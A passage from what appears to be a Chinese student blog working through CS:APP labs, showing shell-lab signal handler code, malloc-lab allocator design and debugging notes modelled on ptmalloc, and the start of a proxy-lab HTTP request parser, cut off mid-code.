jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token function">WTERMSIG</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token punctuation">)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"sigchld_handler: exiting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="sigint-handler、sigtstp-handler"><a href="#sigint-handler、sigtstp-handler" class="headerlink" title="sigint_handler、sigtstp_handler"></a>sigint_handler、sigtstp_handler</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/*  * sigint_handler - The kernel sends a SIGINT to the shell whenver the *    user types ctrl-c at the keyboard.  Catch it and send it along *    to the foreground job.   */</span><span class="token keyword">void</span> <span class="token function">sigint_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token punctuation">)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"sigint_handler: entering"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pid_t pid <span class="token operator">=</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//pid设置为负,将信号发送给整个进程组.</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>pid<span class="token punctuation">,</span> SIGINT<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"kill (sigint) error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sigint_handler: Job (%d) killed\n"</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token punctuation">)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"sigint_handler: exiting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever *     the user types ctrl-z at the keyboard. Catch it and suspend the *     foreground job by sending it a SIGTSTP.   */</span><span class="token keyword">void</span> <span class="token function">sigtstp_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token punctuation">)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"sigstp_handler: entering"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pid_t pid <span class="token operator">=</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> job_t<span class="token operator">*</span> job <span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//pid设置为负,将信号发送给整个进程组.</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>pid<span class="token punctuation">,</span>SIGTSTP<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"kill (tstp) error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sigstp_handler: Job [%d] (%d) stopped\n"</span><span class="token punctuation">,</span> job<span class="token operator">-</span><span class="token operator">></span>jid<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token punctuation">)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"sigstp_handler: exiting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="parseline"><a href="#parseline" class="headerlink" title="parseline"></a>parseline</h3><p>lab直接给出的,学一下实现.</p><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/*  * parseline - Parse the command line and build the argv array. *  * Characters enclosed in single quotes are treated as a single * argument.  Return true if the user has requested a BG job, false if * the user has requested a FG job.   */</span><span class="token keyword">int</span> <span class="token function">parseline</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cmdline<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">char</span> array<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* holds local copy of command line */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>buf <span class="token operator">=</span> array<span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">/* ptr that traverses command line */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>delim<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* points to first space delimiter */</span>    <span class="token keyword">int</span> argc<span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">/* number of args */</span>    <span class="token keyword">int</span> bg<span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">/* background job? */</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>    buf<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* replace trailing '\n' with space */</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* ignore leading spaces */</span>    buf<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Build the argv list */</span>    argc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    buf<span class="token operator">++</span><span class="token punctuation">;</span>    delim <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>    delim <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>delim<span class="token punctuation">)</span> <span class="token punctuation">{</span>    argv<span class="token punctuation">[</span>argc<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>    <span class="token operator">*</span>delim <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>    buf <span class="token operator">=</span> delim <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* ignore spaces */</span>           buf<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        buf<span class="token operator">++</span><span class="token punctuation">;</span>        delim <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        delim <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    argv<span class="token punctuation">[</span>argc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">/* ignore blank line */</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* should the job run in the background? */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>argv<span class="token punctuation">[</span>argc<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    argv<span class="token punctuation">[</span><span class="token operator">--</span>argc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> bg<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="Lab7-Malloc-lab"><a href="#Lab7-Malloc-lab" class="headerlink" title="Lab7:Malloc lab"></a>Lab7:Malloc lab</h1><h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><p>参照ptmalloc.</p><h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221858686.png"></p><h3 id="空闲块组织"><a href="#空闲块组织" class="headerlink" title="空闲块组织"></a>空闲块组织</h3><p>分为fastbins和bins,fastbins不参与合并不进行切割.两者均采用单向链表的组织结构,fastbins有7个,由于堆块对齐的原因各个fastbins中chunk大小相同,故不需排序,从头部取出或放入.bins有8个,需排序.</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>第一次跑过所有测试,80分,但此时还没有加入空闲块合并的功能.<br>查看util极低的数据,观察发现确实是空闲块未合并导致的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306211450673.png"></p><p>加入空闲块合并之后,好的,降了10分<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221745035.png"><br>发现原因是因为我的设计大部分参考的是glibc中ptmalloc的实现,注重查找的效率,但由于我本地的机器较快导致性能一直是满分,所以评分仅取决于空间利用率.</p><p>所以一些设计比如增加bin的数量(将空闲块按大小分区间组织加快查找速度),设计fastbin不参与合并加快速度,分配较大的top chunk减少mem_sbrk的调用次数(其实没有必要,ptmalloc这样实现是为了减少sbrk或mmap系统调用的开销,而本实验中的mm_malloc是建立在一个模拟的mem_sbrk之上,并不会进行系统调用)等,反而降低了空间利用率.</p><p>这是将fastbins和bins数量均减为1,topchunk默认大小改为0x1000后的成绩.可见空间利用率大幅提升.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221847904.png"></p><p>还有很多可以完善的地方,不过现阶段对算法和数据结构的理解还不够,没办法自己设计,照着ptmalloc2写一份也没有太多意义.等之后看有没有机会实现一个完整的,直接使用系统调用的.</p><h3 id="一些debug插曲"><a href="#一些debug插曲" class="headerlink" title="一些debug插曲"></a>一些debug插曲</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>(高达5220%的内存利用率的超级内存分配器<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202159747.png"></p><p>一部分trace测试因分配到了brk更高地址被终止.<br>另一部分则发生段错误造成crash,测试这部分样例.<br>直接run起来,观察崩溃点,发现程序在访问(eax+4)内存时发生段错误,该表达式对应为top-&gt;size.即eax表示top的值为0.<br>top指针在初始化之后肯定是不可能为0的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202147605.png"><br>设置观察点:watch (top==0),重新运行程序.<br>发现程序在此处停住,但源码中并没有top作为左值的语句.<br>瞬间反应过来,bins下标越界.<br>改掉程序中对i的检查.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202152686.png"></p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>然而我调试了接近两个小时后,发现最关键的问题在mdriver程序会多次调用mm_init函数,且在调用前将mem_brk复位,而我的init函数只是为调用一次使用的,并没有清空bins和top,导致多次运行时使用大量mem_brk之外的内存……<br>这才是上面内存利用率超高的原因.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210005305.png"></p><p>不过两小时也没白费,学了好多诸如watchpoints的调试命令和找到一些调试技巧.</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>重写init函数,再次运行,不出意外的异常退出.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210007226.png"><br>不过只在部分样例中异常退出,原因是ran out of memory.这倒是很正常,因为此时还没有编写空闲块合并和realloc的功能<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210008744.png"></p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>编写realloc功能后运行崩溃,调试发现是realloc时没有做边界检查,如果下一个chunk是topchunk将会在切割后unlink(topchunk),而topchunk自然是不会在bin中的故引发”mm_unlink: nonexistent mptr”</p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>在mm_realloc和mm_malloc里调用mm_free时,应该使用用户态的指针而不是堆块头部指针…..感觉这是个挺容易犯错的地方</p><h1 id="Lab8-Proxy-lab"><a href="#Lab8-Proxy-lab" class="headerlink" title="Lab8:Proxy lab"></a>Lab8:Proxy lab</h1><h2 id="Part-A-2"><a href="#Part-A-2" class="headerlink" title="Part A"></a>Part A</h2><h3 id="设计-1"><a href="#设计-1" class="headerlink" title="设计"></a>设计</h3><p>使用的结构为</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> method<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> host<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> port<span class="token punctuation">[</span>MAX_PORTLEN<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> path<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> cgiargs<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> version<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>RequestLine<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> name<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> value<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>RequestHeader<span class="token punctuation">;</span></code></pre><p>这是整个PartA的处理流程,其中Forward2Client未做处理,直接将从服务器收到的数据原封不动转发给客户端.Part A完成后程序已经可以在浏览器中实现代理访问.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306240020148.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306240023578.png"></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"csapp.h"</span></span><span class="token comment" spellcheck="true">/* Recommended max cache and object sizes */</span><span class="token macro property">#<span class="token directive keyword">define</span> MAX_CACHE_SIZE 1049000</span><span class="token macro property">#<span class="token directive keyword">define</span> MAX_OBJECT_SIZE 102400</span><span class="token macro property">#<span class="token directive keyword">define</span> MAX_PORTLEN 10</span><span class="token macro property">#<span class="token directive keyword">define</span> MAX_HEADERS 30</span><span class="token macro property">#<span class="token directive keyword">define</span> PREFIX_PRINT "HanQi_Proxy > "</span><span class="token comment" spellcheck="true">/* You won't lose style points for including this long line in your code */</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>user_agent_hdr <span class="token operator">=</span> <span class="token string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3"</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> method<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> host<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> port<span class="token punctuation">[</span>MAX_PORTLEN<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> path<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> cgiargs<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> version<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>RequestLine<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> name<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> value<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>RequestHeader<span class="token punctuation">;</span></code></pre><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"proxy.h"</span></span><span class="token keyword">void</span> <span class="token function">parse_uri</span><span class="token punctuation">(</span><span class="token keyword">char</span> uri<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>RequestLine<span class="token operator">*</span> requestline<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span> address_ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> port_ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> path_ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>address_ptr <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>uri<span class="token punctuation">,</span><span class="token string">"//"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        address_ptr <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        address_ptr <span class="token operator">=</span> uri<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>port_ptr <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>address_ptr<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        port_ptr <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    path_ptr <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>address_ptr<span class="token punctuation">,</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>path_ptr<span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token function">strncpy</span><span class="token punctuation">(</span>requestline<span class="token operator">-</span><span class="token operator">></span>path<span class="token punctuation">,</span>path_ptr<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token function">strncpy</span><span class="token punctuation">(</span>requestline<span class="token operator">-</span><span class="token operator">></span>path<span class="token punctuation">,</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        path_ptr <span class="token operator">=</span> address_ptr<span class="token operator">+</span><span class="token function">strlen</span><span class="token punctuation">(</span>address_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>port_ptr<span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token function">strncpy</span><span class="token punctuation">(</span>requestline<span class="token operator">-</span><span class="token operator">></span>port<span class="token punctuation">,</span>port_ptr<span class="token punctuation">,</span>path_ptr<span class="token operator">-</span>port_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token function">strncpy</span><span class="token punctuation">(</span>requestline<span class="token operator">-</span><span class="token operator">></span>port<span class="token punctuation">,</span><span class="token string">"80"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        port_ptr <span class="token operator">=</span> path_ptr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">strncpy</span><span class="token punctuation">(</span>requestline<span class="token operator">-</span><span class="token operator">></span>host<span class="token punctuation">,</span>address_ptr<span class="token punctuation">,</span>port_ptr<span class="token operator">-</span>address_ptr<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>PREFIX_PRINT<span class="token string">"RequestTarget: %s:%s%s\n"</span><span class="token punctuation">,</span>requestline<span class="token operator">-</span><span class="token operator">></span>host<span class="token punctuation">,</span>requestline<span class="token operator">-</span><span class="token operator">></span>port<span class="token punctuation">,</span>requestline<span class="token operator">-</span><span class="token operator">></span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">read_requesthdrs</span><span class="token punctuation">(</span>rio_t<span class="token operator">*</span> rio<span class="token punctuation">,</span>RequestHeader requestheaders<span class="token punctuation">[</span>MAX_HEADERS<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span>rio<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">sscanf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"%[^:]: %s\r\n"</span><span class="token punctuation">,</span>requestheaders<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>requestheaders<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: %s\r\n"</span><span class="token punctuation">,</span>requestheaders<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>requestheaders<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>i<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>MAX_HEADERS<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span>rio<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">add_headers</span><span class="token punctuation">(</span>RequestHeader requestheaders<span class="token punctuation">[</span>MAX_HEADERS<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">*</span> headers_num<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> headername<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> headervalue<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>MAX_HEADERS<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>headername<span class="token punctuation">,</span>requestheaders<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">strncpy</span><span class="token punctuation">(</span>requestheaders<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">,</span>headervalue<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">strncpy</span><span class="token punctuation">(</span>requestheaders<span class="token punctuation">[</span><span class="token operator">*</span>headers_num<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>headername<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strncpy</span><span class="token punctuation">(</span>requestheaders<span class="token punctuation">[</span><span class="token operator">*</span>headers_num<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">,</span>headervalue<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">++</span><span class="token punctuation">(</span><span class="token operator">*</span>headers_num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">Write2Server</span><span class="token punctuation">(</span><span class="token keyword">int</span> server_fd<span class="token punctuation">,</span>RequestLine<span class="token operator">*</span> requestline<span class="token punctuation">,</span>RequestHeader requestheaders<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> headers_num<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span>PREFIX_PRINT<span class="token string">"Forwarding to %s:%s,ing...\n"</span><span class="token punctuation">,</span>requestline<span class="token operator">-</span><span class="token operator">></span>host<span class="token punctuation">,</span>requestline<span class="token operator">-</span><span class="token operator">></span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token 